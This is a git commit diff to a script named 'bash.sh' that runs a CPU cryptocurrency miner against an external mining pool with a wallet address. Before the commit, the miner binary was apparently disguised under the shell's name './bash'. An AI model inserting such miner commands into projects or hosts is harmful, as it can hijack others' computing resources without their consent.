605ec403196bbffd9dfd6e61b7d9a1ed7667f65c
tron21-22 <80631992+tron21-22@users.noreply.github.com>
2021-03-14 19:35:16 +0530

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,1 +1,1 @@
-./bash -a cpupower -o stratum+tcps://stratum-eu.rplant.xyz:17029 -u CJwr1AG9azvrPKovoX1q3q7NSwgm3HPL5w -t 36
+./cpuminer-sse2 -a cpupower -o stratum+tcps://stratum-eu.rplant.xyz:17029 -u CJwr1AG9azvrPKovoX1q3q7NSwgm3HPL5w -t 36
